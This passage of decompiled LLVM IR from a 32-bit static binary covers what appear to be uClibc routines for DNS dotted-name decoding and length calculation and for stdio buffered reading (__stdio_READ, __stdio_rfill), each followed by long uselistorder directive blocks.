dec_label_pc_8057d90:                             ; preds = %dec_label_pc_8057d90.lr.ph, %dec_label_pc_8057da9
  %v0_8057d9a = phi i32 [ %v0_8057d9a.pre, %dec_label_pc_8057d90.lr.ph ], [ %v4_8057db4, %dec_label_pc_8057da9 ]
  %v8_8057d9038 = phi i1 [ %v8_8057d903350, %dec_label_pc_8057d90.lr.ph ], [ true, %dec_label_pc_8057da9 ]
  %v5_8057e2037.in = phi i8 [ %v5_8057e203049.in, %dec_label_pc_8057d90.lr.ph ], [ %v4_8057e20, %dec_label_pc_8057da9 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8057d90.lr.ph ], [ 0, %dec_label_pc_8057da9 ]
  %v0_8057d9735 = phi i32 [ %v0_8057d97.ph46, %dec_label_pc_8057d90.lr.ph ], [ %v2_8057dc3, %dec_label_pc_8057da9 ]
  %v5_8057e2037 = zext i8 %v5_8057e2037.in to i32
  %v1_8057d97 = add i32 %v0_8057d9735, 1
  store i32 %v1_8057d97, i32* @esi, align 4
  %v3_8057d9a = select i1 %v8_8057d9038, i32 2, i32 1
  %v4_8057d9a = add i32 %v3_8057d9a, %v0_8057d9a
  store i32 %v4_8057d9a, i32* %ebp.global-to-local, align 4
  %v1_8057d9d = and i32 %v5_8057e2037, 192
  %v6_8057da2 = icmp eq i32 %v1_8057d9d, 192
  %v1_8057da7 = icmp eq i1 %v6_8057da2, false
  br i1 %v1_8057da7, label %dec_label_pc_8057dcc, label %dec_label_pc_8057da9

dec_label_pc_8057da9:                             ; preds = %dec_label_pc_8057d90
  %v4_8057db4 = add i32 %v3_8057d9a, %v4_8057d9a
  store i32 %v4_8057db4, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_8057e2037.in, 64
  %v1_8057db7 = zext i8 %tmp to i32
  %v2_8057dba = add i32 %v1_8057d97, %arg1
  %v3_8057dba = inttoptr i32 %v2_8057dba to i8*
  %v4_8057dba = load i8, i8* %v3_8057dba, align 1
  %v5_8057dba = zext i8 %v4_8057dba to i32
  %v2_8057dbe = mul nuw nsw i32 %v1_8057db7, 256
  %v2_8057dc3 = or i32 %v5_8057dba, %v2_8057dbe
  store i32 %v2_8057dc3, i32* @edx, align 4
  store i32 %v1_8057de9.ph47, i32* @ecx, align 4
  %v2_8057e20 = add i32 %v2_8057dc3, %arg1
  %v3_8057e20 = inttoptr i32 %v2_8057e20 to i8*
  %v4_8057e20 = load i8, i8* %v3_8057e20, align 1
  %v1_8057e24 = icmp eq i8 %v4_8057e20, 0
  %v1_8057e26 = icmp eq i1 %v1_8057e24, false
  br i1 %v1_8057e26, label %dec_label_pc_8057d90, label %dec_label_pc_8057e2c

dec_label_pc_8057dcc:                             ; preds = %dec_label_pc_8057d90
  %v2_8057dcc = add i32 %v5_8057e2037, %v1_8057de9.ph47
  %v1_8057dd5 = add i32 %v2_8057dcc, 1
  store i32 %v1_8057dd5, i32* @edi, align 4
  %v10_8057dd6 = icmp ult i32 %v1_8057dd5, %arg4
  %v1_8057dda = icmp eq i1 %v10_8057dd6, false
  br i1 %v1_8057dda, label %dec_label_pc_8057e38, label %dec_label_pc_8057ddc

dec_label_pc_8057ddc:                             ; preds = %dec_label_pc_8057dcc
  %v2_8057de2 = add i32 %v1_8057d97, %arg1
  %v2_8057de9 = add i32 %v1_8057de9.ph47, %arg3
  %v3_8057dec = inttoptr i32 %v2_8057de9 to i16*
  %v4_8057dec = call i32 @memcpy(i16* %v3_8057dec, i32 %v2_8057de2, i32 %v5_8057e2037)
  %v0_8057df4 = load i32, i32* @esi, align 4
  %v2_8057df4 = add i32 %v0_8057df4, %v5_8057e2037
  store i32 %v2_8057df4, i32* @edx, align 4
  br i1 %v8_8057d9038, label %dec_label_pc_8057e00, label %dec_label_pc_8057dfe

dec_label_pc_8057dfe:                             ; preds = %dec_label_pc_8057ddc
  %v0_8057dfe = load i32, i32* %ebp.global-to-local, align 4
  %v2_8057dfe = add i32 %v0_8057dfe, %v5_8057e2037
  store i32 %v2_8057dfe, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8057e00

dec_label_pc_8057e00:                             ; preds = %dec_label_pc_8057ddc, %dec_label_pc_8057dfe
  %v4_8057e17 = add i32 %v2_8057dcc, %arg3
  %v5_8057e17 = inttoptr i32 %v4_8057e17 to i8*
  store i8 46, i8* %v5_8057e17, align 1
  %v0_8057e1a.pre = load i32, i32* @edi, align 4
  %v1_8057e20.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8057e1a.pre, i32* @ecx, align 4
  %v2_8057e2027 = add i32 %v1_8057e20.pre.pre, %arg1
  %v3_8057e2028 = inttoptr i32 %v2_8057e2027 to i8*
  %v4_8057e2029 = load i8, i8* %v3_8057e2028, align 1
  %v1_8057e2431 = icmp eq i8 %v4_8057e2029, 0
  %v1_8057e2632 = icmp eq i1 %v1_8057e2431, false
  %v8_8057d9033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8057d9a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8057e2632, label %dec_label_pc_8057d90.lr.ph, label %dec_label_pc_8057e2c

dec_label_pc_8057d90.lr.ph:                       ; preds = %dec_label_pc_8057e00, %dec_label_pc_8057d82
  %v0_8057d9a.pre = phi i32 [ 0, %dec_label_pc_8057d82 ], [ %v0_8057d9a.pre.pre, %dec_label_pc_8057e00 ]
  %v8_8057d903350 = phi i1 [ false, %dec_label_pc_8057d82 ], [ %v8_8057d9033, %dec_label_pc_8057e00 ]
  %v5_8057e203049.in = phi i8 [ %v4_8057e202942, %dec_label_pc_8057d82 ], [ %v4_8057e2029, %dec_label_pc_8057e00 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8057d82 ], [ %stack_var_-17.136, %dec_label_pc_8057e00 ]
  %v1_8057de9.ph47 = phi i32 [ 0, %dec_label_pc_8057d82 ], [ %v0_8057e1a.pre, %dec_label_pc_8057e00 ]
  %v0_8057d97.ph46 = phi i32 [ %arg2, %dec_label_pc_8057d82 ], [ %v1_8057e20.pre.pre, %dec_label_pc_8057e00 ]
  br label %dec_label_pc_8057d90

dec_label_pc_8057e2c:                             ; preds = %dec_label_pc_8057e00, %dec_label_pc_8057da9, %dec_label_pc_8057d82
  %v0_8057e31 = phi i32 [ 0, %dec_label_pc_8057d82 ], [ %v4_8057db4, %dec_label_pc_8057da9 ], [ %v0_8057d9a.pre.pre, %dec_label_pc_8057e00 ]
  %v8_8057d90.lcssa = phi i1 [ false, %dec_label_pc_8057d82 ], [ true, %dec_label_pc_8057da9 ], [ %v8_8057d9033, %dec_label_pc_8057e00 ]
  %v2_8057e33 = zext i1 %v8_8057d90.lcssa to i32
  %v3_8057e33 = add i32 %v0_8057e31, 1
  %v4_8057e33 = add i32 %v3_8057e33, %v2_8057e33
  br label %dec_label_pc_8057e3b

dec_label_pc_8057e38:                             ; preds = %dec_label_pc_8057dcc, %entry
  br label %dec_label_pc_8057e3b

dec_label_pc_8057e3b:                             ; preds = %dec_label_pc_8057e2c, %dec_label_pc_8057e38
  %storemerge = phi i32 [ %v4_8057e33, %dec_label_pc_8057e2c ], [ -1, %dec_label_pc_8057e38 ]
  store i32 %v0_8057d6e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057de9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8057e20, { 1, 0 }
  uselistorder i32 %v2_8057dc3, { 0, 2, 1 }
  uselistorder i32 %v4_8057db4, { 0, 2, 1 }
  uselistorder i32 %v5_8057e2037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 28, 31, 2, 30, 29, 25, 3, 26, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 5, 6, 27, 24 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 3, 4, 5, 6, 7, 8, 9, 13, 17, 18, 14, 16, 20, 12, 19, 10, 11, 15, 0, 1, 2 }
  uselistorder i32* @edi, { 2, 136, 137, 21, 138, 139, 140, 20, 141, 142, 3, 143, 0, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 29, 5, 4, 30, 31, 32, 33, 34, 42, 35, 36, 37, 38, 39, 40, 41, 159, 6, 160, 7, 161, 162, 163, 164, 169, 170, 1, 165, 166, 167, 168, 171, 172, 173, 174, 8, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 9, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 94, 95, 96, 97, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 10, 229, 230, 231, 232, 233, 234, 235, 329, 330, 11, 331, 332, 12, 335, 336, 286, 287, 288, 337, 338, 339, 354, 111, 13, 112, 113, 114, 43, 44, 45, 46, 47, 48, 49, 119, 14, 120, 121, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 15, 319, 320, 321, 322, 323, 265, 266, 16, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 236, 237, 17, 238, 352, 353, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 18, 263, 26, 27, 28, 249, 19, 250, 251, 264, 348, 349, 350, 351, 115, 116, 117, 118, 333, 334, 122, 123, 284, 285, 50, 51, 52, 289, 290, 345, 346, 347, 291, 292, 53, 54, 55, 340, 341, 342, 343, 344, 56, 57, 58, 61, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 22, 23, 24, 25, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 279, 280, 281, 282, 283, 293, 294, 295, 324, 325, 326, 327, 328 }
  uselistorder i32 256, { 1, 4, 2, 3, 5, 6, 7, 8, 9, 48, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 54, 21, 47, 22, 23, 24, 25, 26, 43, 44, 27, 45, 49, 28, 29, 53, 30, 31, 0, 51, 52, 46, 32, 33, 34, 35, 36, 37, 38, 39, 40, 50, 55, 41, 42 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 309, 310, 311, 312, 313, 314, 315, 316, 9, 317, 318, 319, 320, 321, 21, 3, 324, 322, 323, 2, 325, 326, 327, 328, 329, 330, 331, 332, 29, 33, 30, 31, 32, 333, 334, 335, 336, 337, 338, 339, 345, 340, 341, 342, 343, 344, 4, 22, 75, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 363, 362, 5, 364, 365, 366, 367, 419, 10, 6, 23, 76, 368, 369, 370, 371, 372, 373, 374, 375, 376, 502, 503, 504, 505, 11, 506, 507, 410, 422, 425, 85, 426, 0, 509, 34, 510, 427, 512, 513, 520, 519, 86, 42, 12, 43, 44, 45, 46, 47, 48, 49, 87, 88, 89, 90, 91, 35, 430, 431, 13, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 14, 445, 446, 428, 429, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 15, 484, 485, 486, 487, 488, 489, 490, 515, 92, 411, 412, 414, 415, 416, 1, 413, 418, 377, 378, 379, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 20, 397, 398, 380, 399, 16, 400, 401, 403, 17, 404, 405, 406, 407, 408, 28, 18, 402, 409, 511, 19, 93, 420, 421, 508, 94, 514, 417, 516, 501, 423, 424, 306, 36, 517, 518, 37, 38, 39, 40, 41, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 77, 78, 79, 80, 81, 82, 83, 84, 24, 25, 26, 27, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 307, 308, 491, 492, 493, 494, 496, 500, 495, 498, 499, 7, 497, 521 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057e3b, { 1, 0 }
  uselistorder label %dec_label_pc_8057e00, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8057e52 = icmp eq i32 %arg1, 0
  br i1 %v1_8057e52, label %dec_label_pc_8057e81, label %dec_label_pc_8057e72.preheader

dec_label_pc_8057e72.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_8057e7210 = add i32 %arg2, %arg1
  %v3_8057e7211 = inttoptr i32 %v2_8057e7210 to i8*
  %v4_8057e7212 = load i8, i8* %v3_8057e7211, align 1
  %v1_8057e7614 = add i32 %arg2, 1
  %v1_8057e7915 = icmp eq i8 %v4_8057e7212, 0
  %v1_8057e7b16 = icmp eq i1 %v1_8057e7915, false
  br i1 %v1_8057e7b16, label %dec_label_pc_8057e61, label %dec_label_pc_8057e7d

dec_label_pc_8057e58:                             ; preds = %dec_label_pc_8057e61
  %v1_8057e58 = add i32 %v0_8057e5817, 2
  br label %dec_label_pc_8057e7d

dec_label_pc_8057e61:                             ; preds = %dec_label_pc_8057e72.preheader, %dec_label_pc_8057e72
  %v1_8057e7619 = phi i32 [ %v1_8057e76, %dec_label_pc_8057e72 ], [ %v1_8057e7614, %dec_label_pc_8057e72.preheader ]
  %v5_8057e7218.in = phi i8 [ %v4_8057e72, %dec_label_pc_8057e72 ], [ %v4_8057e7212, %dec_label_pc_8057e72.preheader ]
  %v0_8057e5817 = phi i32 [ %v2_8057e6f, %dec_label_pc_8057e72 ], [ %arg2, %dec_label_pc_8057e72.preheader ]
  %v5_8057e7218 = zext i8 %v5_8057e7218.in to i32
  %v1_8057e63 = and i32 %v5_8057e7218, 192
  %v6_8057e68 = icmp eq i32 %v1_8057e63, 192
  %v2_8057e6f = add i32 %v5_8057e7218, %v1_8057e7619
  br i1 %v6_8057e68, label %dec_label_pc_8057e58, label %dec_label_pc_8057e72

dec_label_pc_8057e72:                             ; preds = %dec_label_pc_8057e61
  store i32 %v2_8057e6f, i32* @ecx, align 4
  %v2_8057e72 = add i32 %v2_8057e6f, %arg1
  %v3_8057e72 = inttoptr i32 %v2_8057e72 to i8*
  %v4_8057e72 = load i8, i8* %v3_8057e72, align 1
  %v1_8057e76 = add i32 %v2_8057e6f, 1
  %v1_8057e79 = icmp eq i8 %v4_8057e72, 0
  %v1_8057e7b = icmp eq i1 %v1_8057e79, false
  br i1 %v1_8057e7b, label %dec_label_pc_8057e61, label %dec_label_pc_8057e7d

dec_label_pc_8057e7d:                             ; preds = %dec_label_pc_8057e72.preheader, %dec_label_pc_8057e72, %dec_label_pc_8057e58
  %v0_8057e7d = phi i32 [ %v1_8057e58, %dec_label_pc_8057e58 ], [ %v1_8057e7614, %dec_label_pc_8057e72.preheader ], [ %v1_8057e76, %dec_label_pc_8057e72 ]
  %v2_8057e7f = sub i32 %v0_8057e7d, %arg2
  br label %dec_label_pc_8057e81

dec_label_pc_8057e81:                             ; preds = %entry, %dec_label_pc_8057e7d
  %v0_8057e84 = phi i32 [ -1, %entry ], [ %v2_8057e7f, %dec_label_pc_8057e7d ]
  ret i32 %v0_8057e84

; uselistorder directives
  uselistorder i8 %v4_8057e72, { 1, 0 }
  uselistorder i32 %v2_8057e6f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 2, { 155, 49, 156, 157, 4, 79, 158, 48, 94, 160, 161, 53, 58, 57, 159, 162, 163, 164, 135, 165, 166, 167, 168, 169, 170, 140, 59, 141, 142, 68, 171, 172, 60, 95, 69, 61, 62, 173, 174, 70, 63, 175, 90, 176, 177, 178, 179, 136, 194, 195, 75, 180, 181, 91, 5, 80, 81, 202, 76, 134, 3, 96, 131, 97, 132, 98, 133, 71, 6, 144, 54, 99, 100, 0, 101, 1, 102, 2, 103, 104, 7, 8, 9, 10, 197, 11, 12, 92, 13, 188, 189, 190, 191, 64, 82, 149, 150, 192, 193, 72, 73, 74, 14, 203, 83, 182, 183, 78, 15, 16, 184, 55, 17, 185, 18, 84, 186, 187, 196, 201, 93, 19, 143, 107, 105, 106, 108, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 65, 145, 31, 32, 33, 66, 146, 34, 35, 36, 37, 38, 147, 109, 39, 148, 110, 40, 85, 41, 42, 43, 44, 50, 45, 51, 46, 111, 112, 113, 114, 86, 115, 116, 117, 77, 118, 119, 120, 121, 122, 125, 123, 124, 137, 138, 139, 126, 127, 151, 52, 152, 67, 153, 87, 56, 154, 128, 129, 88, 200, 89, 198, 47, 199, 130 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057e81, { 1, 0 }
  uselistorder label %dec_label_pc_8057e7d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057e61, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057e88 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e88, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8057e8e = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057e8e, i32* @ebx, align 4
  %v1_8057e96 = bitcast i16* %arg1 to i8*
  %v2_8057e96 = load i8, i8* %v1_8057e96, align 1
  %v3_8057e96 = and i8 %v2_8057e96, 4
  %v4_8057e96 = icmp eq i8 %v3_8057e96, 0
  %v1_8057e99 = icmp eq i1 %v4_8057e96, false
  br i1 %v1_8057e99, label %dec_label_pc_8057ec8, label %dec_label_pc_8057e9b

dec_label_pc_8057e9b:                             ; preds = %entry
  %v2_8057e9b = icmp slt i32 %arg3, 0
  %v1_8057e9d = icmp eq i1 %v2_8057e9b, false
  br i1 %v1_8057e9d, label %dec_label_pc_8057ea4, label %dec_label_pc_8057e9f

dec_label_pc_8057e9f:                             ; preds = %dec_label_pc_8057e9b
  br label %dec_label_pc_8057ea4

dec_label_pc_8057ea4:                             ; preds = %dec_label_pc_8057e9b, %dec_label_pc_8057e9f
  %v0_8057ea5 = phi i32 [ %arg3, %dec_label_pc_8057e9b ], [ 2147483647, %dec_label_pc_8057e9f ]
  %v1_8057eaa = add i32 %v4_8057e8e, 4
  %v2_8057eaa = inttoptr i32 %v1_8057eaa to i32*
  %v3_8057eaa = load i32, i32* %v2_8057eaa, align 4
  %v3_8057ead = inttoptr i32 %arg2 to i32*
  %v4_8057ead = call i32 @__libc_read(i32 %v3_8057eaa, i32* %v3_8057ead, i32 %v0_8057ea5)
  store i32 %v4_8057ead, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_8057ead, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8057ec8, label %dec_label_pc_8057eba

dec_label_pc_8057eba:                             ; preds = %dec_label_pc_8057ea4
  %v1_8057eb5 = icmp eq i32 %v4_8057ead, 0
  %v4_8057eb8 = icmp eq i1 %v1_8057eb5, false
  %v0_8057ec2 = load i32, i32* @ebx, align 4
  %v1_8057ec2 = inttoptr i32 %v0_8057ec2 to i16*
  %v2_8057ec2 = load i16, i16* %v1_8057ec2, align 2
  br i1 %v4_8057eb8, label %dec_label_pc_8057ec2, label %dec_label_pc_8057ebc

dec_label_pc_8057ebc:                             ; preds = %dec_label_pc_8057eba
  %v3_8057ebc = or i16 %v2_8057ec2, 4
  store i16 %v3_8057ebc, i16* %v1_8057ec2, align 2
  %v0_8057ecb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057ec8

dec_label_pc_8057ec2:                             ; preds = %dec_label_pc_8057eba
  %v3_8057ec2 = or i16 %v2_8057ec2, 8
  store i16 %v3_8057ec2, i16* %v1_8057ec2, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057ec8

dec_label_pc_8057ec8:                             ; preds = %dec_label_pc_8057ea4, %entry, %dec_label_pc_8057ebc, %dec_label_pc_8057ec2
  %v0_8057ecb = phi i32 [ %v4_8057ead, %dec_label_pc_8057ea4 ], [ 0, %entry ], [ %v0_8057ecb.pre, %dec_label_pc_8057ebc ], [ 0, %dec_label_pc_8057ec2 ]
  %v2_8057eca = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057eca, i32* @ebx, align 4
  ret i32 %v0_8057ecb

; uselistorder directives
  uselistorder i16 %v2_8057ec2, { 1, 0 }
  uselistorder i32 %v4_8057ead, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 4, { 246, 247, 248, 249, 256, 257, 258, 252, 250, 251, 253, 254, 255, 34, 2, 259, 260, 261, 262, 263, 264, 265, 266, 267, 42, 155, 156, 157, 43, 44, 45, 268, 73, 35, 212, 3, 4, 269, 270, 271, 272, 5, 273, 82, 274, 275, 276, 277, 6, 278, 279, 280, 281, 282, 283, 284, 285, 91, 286, 287, 288, 289, 100, 46, 290, 291, 292, 293, 47, 48, 49, 101, 50, 51, 52, 53, 294, 54, 295, 102, 55, 103, 104, 7, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 83, 306, 388, 307, 389, 390, 396, 397, 0, 402, 403, 404, 391, 74, 130, 216, 217, 392, 393, 394, 395, 8, 158, 159, 160, 161, 162, 105, 220, 221, 222, 92, 239, 240, 241, 242, 163, 164, 165, 166, 167, 93, 9, 168, 169, 398, 400, 341, 342, 343, 344, 345, 346, 10, 347, 348, 349, 350, 351, 352, 353, 354, 339, 340, 355, 79, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 31, 376, 377, 379, 378, 11, 170, 399, 218, 219, 329, 330, 75, 331, 332, 333, 334, 36, 12, 37, 335, 94, 171, 95, 401, 13, 308, 14, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 56, 57, 131, 38, 326, 327, 328, 177, 172, 173, 174, 41, 106, 107, 108, 175, 58, 59, 109, 15, 176, 16, 17, 32, 18, 1, 19, 178, 179, 180, 181, 182, 20, 183, 184, 185, 110, 186, 187, 188, 111, 189, 190, 191, 192, 193, 194, 112, 195, 196, 113, 197, 198, 199, 200, 201, 202, 203, 114, 204, 205, 60, 206, 126, 207, 80, 208, 61, 84, 115, 63, 62, 209, 127, 210, 81, 211, 64, 85, 116, 86, 96, 97, 98, 213, 117, 118, 119, 29, 120, 121, 99, 30, 122, 123, 76, 125, 87, 65, 124, 77, 214, 215, 78, 132, 133, 134, 135, 136, 72, 137, 138, 71, 139, 140, 141, 69, 70, 142, 128, 143, 66, 144, 67, 68, 145, 146, 147, 148, 149, 150, 151, 152, 153, 223, 224, 225, 226, 227, 228, 229, 230, 231, 21, 22, 232, 233, 234, 235, 236, 237, 238, 39, 243, 33, 23, 244, 24, 88, 89, 129, 245, 90, 336, 337, 25, 40, 26, 27, 338, 28, 380, 381, 382, 383, 384, 385, 386, 387, 405, 406, 407, 154 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i8 0, { 134, 40, 5, 8, 9, 41, 7, 6, 135, 136, 137, 138, 11, 144, 139, 140, 10, 142, 143, 141, 36, 145, 2, 3, 81, 82, 146, 147, 38, 148, 12, 14, 114, 113, 13, 42, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 17, 168, 164, 165, 163, 15, 166, 167, 16, 37, 169, 170, 171, 172, 173, 174, 175, 225, 226, 19, 116, 115, 18, 117, 118, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 4, 192, 193, 194, 248, 195, 249, 252, 95, 43, 60, 96, 20, 251, 231, 232, 233, 234, 235, 236, 237, 238, 239, 44, 240, 217, 22, 126, 127, 21, 196, 197, 61, 1, 32, 33, 34, 31, 0, 45, 46, 47, 198, 216, 220, 221, 199, 200, 201, 202, 203, 204, 205, 23, 206, 207, 24, 208, 209, 210, 211, 212, 213, 214, 215, 79, 250, 125, 83, 84, 25, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 48, 110, 111, 112, 49, 119, 120, 121, 122, 123, 124, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 39, 128, 129, 130, 131, 132, 133, 218, 219, 222, 223, 224, 26, 227, 228, 35, 229, 27, 230, 241, 246, 245, 28, 242, 243, 30, 244, 29, 247, 80, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i8 4, { 4, 1, 0, 5, 6, 3, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057ec8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8057ea4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8057ecc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057ed4 = add i32 %arg1, 8
  %v2_8057ed4 = inttoptr i32 %v1_8057ed4 to i32*
  %v3_8057ed4 = load i32, i32* %v2_8057ed4, align 4
  store i32 %v3_8057ed4, i32* %edx.global-to-local, align 4
  %v1_8057ed7 = add i32 %arg1, 12
  %v2_8057ed7 = inttoptr i32 %v1_8057ed7 to i32*
  %v3_8057ed7 = load i32, i32* %v2_8057ed7, align 4
  %v2_8057eda = sub i32 %v3_8057ed7, %v3_8057ed4
  %v3_8057edf = inttoptr i32 %arg1 to i16*
  %v4_8057edf = call i32 @__stdio_READ(i16* %v3_8057edf, i32 %v3_8057ed4, i32 %v2_8057eda)
  %v0_8057ee4 = load i32, i32* @ebx, align 4
  %v1_8057ee4 = add i32 %v0_8057ee4, 8
  %v2_8057ee4 = inttoptr i32 %v1_8057ee4 to i32*
  %v3_8057ee4 = load i32, i32* %v2_8057ee4, align 4
  store i32 %v3_8057ee4, i32* %edx.global-to-local, align 4
  %v2_8057ee7 = add i32 %v0_8057ee4, 16
  %v3_8057ee7 = inttoptr i32 %v2_8057ee7 to i32*
  store i32 %v3_8057ee4, i32* %v3_8057ee7, align 4
  %v0_8057eea = load i32, i32* %edx.global-to-local, align 4
  %v2_8057eea = add i32 %v0_8057eea, %v4_8057edf
  store i32 %v2_8057eea, i32* %edx.global-to-local, align 4
  %v1_8057eec = load i32, i32* @ebx, align 4
  %v2_8057eec = add i32 %v1_8057eec, 20
  %v3_8057eec = inttoptr i32 %v2_8057eec to i32*
  store i32 %v2_8057eea, i32* %v3_8057eec, align 4
  store i32 %v0_8057ecc, i32* @ebx, align 4
  ret i32 %v4_8057edf

; uselistorder directives
  uselistorder i32 %v4_8057edf, { 1, 0 }
  uselistorder i32 20, { 23, 24, 25, 26, 27, 28, 29, 5, 30, 31, 7, 32, 6, 33, 34, 4, 11, 12, 21, 13, 35, 36, 37, 0, 38, 1, 39, 8, 40, 41, 42, 14, 15, 16, 17, 18, 19, 20, 9, 3, 22, 10, 2 }
